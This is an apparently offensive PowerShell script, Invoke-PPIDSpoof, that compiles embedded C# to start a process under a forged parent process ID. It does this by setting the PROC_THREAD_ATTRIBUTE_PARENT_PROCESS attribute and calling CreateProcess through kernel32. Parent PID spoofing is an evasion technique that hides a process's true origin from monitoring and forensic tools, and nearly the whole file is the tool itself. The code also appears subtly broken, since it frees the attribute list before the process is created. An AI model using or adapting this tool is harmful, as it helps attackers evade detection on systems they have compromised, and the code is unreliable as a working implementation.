function Invoke-PPIDSpoof
{    
    [CmdletBinding()]
    Param (
        [String]
        $procname = ""

    )

$ppid = @"
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;


namespace PPID
{
    public class ProcessCreator
    {
        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
        struct STARTUPINFOEX
        {
            public STARTUPINFO StartupInfo;
            public IntPtr lpAttributeList;
        }

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
        struct STARTUPINFO
        {
            public Int32 cb;
            public string lpReserved;
            public string lpDesktop;
            public string lpTitle;
            public Int32 dwX;
            public Int32 dwY;
            public Int32 dwXSize;
            public Int32 dwYSize;
            public Int32 dwXCountChars;
            public Int32 dwYCountChars;
            public Int32 dwFillAttribute;
            public Int32 dwFlags;
            public Int16 wShowWindow;
            public Int16 cbReserved2;
            public IntPtr lpReserved2;
            public IntPtr hStdInput;
            public IntPtr hStdOutput;
            public IntPtr hStdError;
        }

        [StructLayout(LayoutKind.Sequential)]
        internal struct PROCESS_INFORMATION
        {
            public IntPtr hProcess;
            public IntPtr hThread;
            public int dwProcessId;
            public int dwThreadId;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct SECURITY_ATTRIBUTES
        {
            public int nLength;
            public IntPtr lpSecurityDescriptor;
            public int bInheritHandle;
        }

        [Flags]
        public enum CreateProcessFlags : uint
        {
            CREATE_BREAKAWAY_FROM_JOB = 0x01000000,
            CREATE_DEFAULT_ERROR_MODE = 0x04000000,
            CREATE_NEW_CONSOLE = 0x00000010,
            CREATE_NEW_PROCESS_GROUP = 0x00000200,
            CREATE_NO_WINDOW = 0x08000000,
            CREATE_PROTECTED_PROCESS = 0x00040000,
            CREATE_PRESERVE_CODE_AUTHZ_LEVEL = 0x02000000,
            CREATE_SEPARATE_WOW_VDM = 0x00000800,
            CREATE_SHARED_WOW_VDM = 0x00001000,
            CREATE_SUSPENDED = 0x00000004,
            CREATE_UNICODE_ENVIRONMENT = 0x00000400,
            DEBUG_ONLY_THIS_PROCESS = 0x00000002,
            DEBUG_PROCESS = 0x00000001,
            DETACHED_PROCESS = 0x00000008,
            EXTENDED_STARTUPINFO_PRESENT = 0x00080000,
            INHERIT_PARENT_AFFINITY = 0x00010000
        }

        [DllImport("kernel32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        static extern bool CreateProcess(
            string lpApplicationName,
            string lpCommandLine,
            ref SECURITY_ATTRIBUTES lpProcessAttributes,
            ref SECURITY_ATTRIBUTES lpThreadAttributes,
            bool bInheritHandles,
            CreateProcessFlags dwCreationFlags,
            IntPtr lpEnvironment,
            string lpCurrentDirectory,
            [In] ref STARTUPINFOEX lpStartupInfo,
            out PROCESS_INFORMATION lpProcessInformation);

        [DllImport("kernel32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool UpdateProcThreadAttribute(
            IntPtr lpAttributeList,
            uint dwFlags,
            IntPtr Attribute,
            IntPtr lpValue,
            IntPtr cbSize,
            IntPtr lpPreviousValue,
            IntPtr lpReturnSize);

        [DllImport("kernel32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool InitializeProcThreadAttributeList(
            IntPtr lpAttributeList,
            int dwAttributeCount,
            int dwFlags,
            ref IntPtr lpSize);

        static void FreeHandle(IntPtr handle)
        {
            Marshal.FreeHGlobal(handle);
            handle = IntPtr.Zero;
        }

        public static int NewParentPID(string ProcName)
        {
            int NewPPID = 0;
            Process[] processList = Process.GetProcesses();

            foreach (Process Proc in processList)
            {
                if (Proc.ProcessName == ProcName)
                {
                    try
                    {
                        IntPtr pHandle = Process.GetProcessById(Proc.Id).Handle;
                        if (pHandle != IntPtr.Zero)
                        {
                            NewPPID = Proc.Id;
                            break;
                        }
                    }
                    catch (Exception ex)
                    {
                        string ErrorMessage = ex.Message;
                    }
                }
            }

            return NewPPID;
        }

        public static bool CreateProcess(int parentProcessId, string lpApplicationName, string lpCommandLine)
        {
            PROCESS_INFORMATION pInfo = new PROCESS_INFORMATION();
            STARTUPINFOEX sInfoEx = new STARTUPINFOEX();
            sInfoEx.StartupInfo = new STARTUPINFO();

            SECURITY_ATTRIBUTES pSec = new SECURITY_ATTRIBUTES();
            SECURITY_ATTRIBUTES tSec = new SECURITY_ATTRIBUTES();

            const int PROC_THREAD_ATTRIBUTE_PARENT_PROCESS = 0x00020000;

            if (parentProcessId > 0)
            {
                IntPtr lpSize = Marshal.AllocHGlobal(IntPtr.Size);
                bool success = InitializeProcThreadAttributeList(IntPtr.Zero, 1, 0, ref lpSize);
                if (success || lpSize == IntPtr.Zero)
                {
                    FreeHandle(lpSize);
                    return false;
                }

                sInfoEx.lpAttributeList = Marshal.AllocHGlobal(lpSize);
                if (sInfoEx.lpAttributeList == IntPtr.Zero)
                {
                    FreeHandle(sInfoEx.lpAttributeList);
                    FreeHandle(lpSize);
                    return false;
                }

                success = InitializeProcThreadAttributeList(sInfoEx.lpAttributeList, 1, 0, ref lpSize);
                if (!success)
                {
                    FreeHandle(sInfoEx.lpAttributeList);
                    FreeHandle(lpSize);
                    return false;
                }

                FreeHandle(lpSize);

                IntPtr parentProcessHandle = Marshal.AllocHGlobal(IntPtr.Size);
                IntPtr hProcess = Process.GetProcessById(parentProcessId).Handle;
                Marshal.WriteIntPtr(parentProcessHandle, hProcess);
                success = UpdateProcThreadAttribute(
                    sInfoEx.lpAttributeList,
                    0,
                    (IntPtr)PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,
                    parentProcessHandle,
                    (IntPtr)IntPtr.Size,
                    IntPtr.Zero,
                    IntPtr.Zero);
                if (!success)
                {
                    FreeHandle(sInfoEx.lpAttributeList);
                    FreeHandle(parentProcessHandle);
                    return false;
                }

                sInfoEx.StartupInfo.cb = Marshal.SizeOf(sInfoEx);
                FreeHandle(sInfoEx.lpAttributeList);
                FreeHandle(parentProcessHandle);
            }

            pSec.nLength = Marshal.SizeOf(pSec);
            tSec.nLength = Marshal.SizeOf(tSec);

            bool result = CreateProcess(
                lpApplicationName,
                lpCommandLine,
                ref pSec,
                ref tSec,
                false,
                CreateProcessFlags.EXTENDED_STARTUPINFO_PRESENT | CreateProcessFlags.CREATE_NEW_CONSOLE,
                IntPtr.Zero,
                null,
                ref sInfoEx,
                out pInfo);
            if (!result)
            {
                return false;
            }

            return true;
        }
    }
}
"@

Add-Type -TypeDefinition $ppid -Language CSharp

$procid = [PPID.ProcessCreator]::NewParentPID("$procname")
if ($procid -eq "0")
{
    Write-Host "No Suitable Pocess ID Found..."
    return;
}
if (!([PPID.ProcessCreator]::CreateProcess("$procid", "$procname","")))
{
    Write-Host "[!] PPID Spoof failed..."
    return;
}
}
